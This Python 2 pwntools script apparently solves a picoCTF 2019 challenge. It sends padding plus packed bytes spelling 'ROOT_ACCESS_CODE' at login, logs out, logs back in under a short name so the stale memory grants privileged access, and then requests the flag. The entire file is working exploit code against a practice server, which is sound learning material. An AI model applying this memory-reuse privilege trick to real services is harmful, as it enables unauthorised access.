from pwn import *
p = remote("2019shell1.picoctf.com",45173)
payload = "A"*8 + p64(0x4343415f544f4f52) + p64(0x45444f435f535345) + "A"*8
name = "rahul"
print p.recvuntil(">")
print "login command"
p.sendline("login")
print p.recvline()
p.sendline(str(len(payload)))
print p.recvline()
p.sendline(payload)

print p.recvuntil(">")
print p.recvuntil(">")
print "logout command"
p.sendline("logout")

print p.recvuntil(">")
p.sendline("login")
print p.recvline()
p.sendline(str(len(name)))
print p.recvline()
p.sendline(name)

print p.recvuntil(">")
print p.recvuntil(">")
print "print-flag command"
p.sendline("print-flag")

print p.recvuntil(">")
p.sendline("quit")
p.close()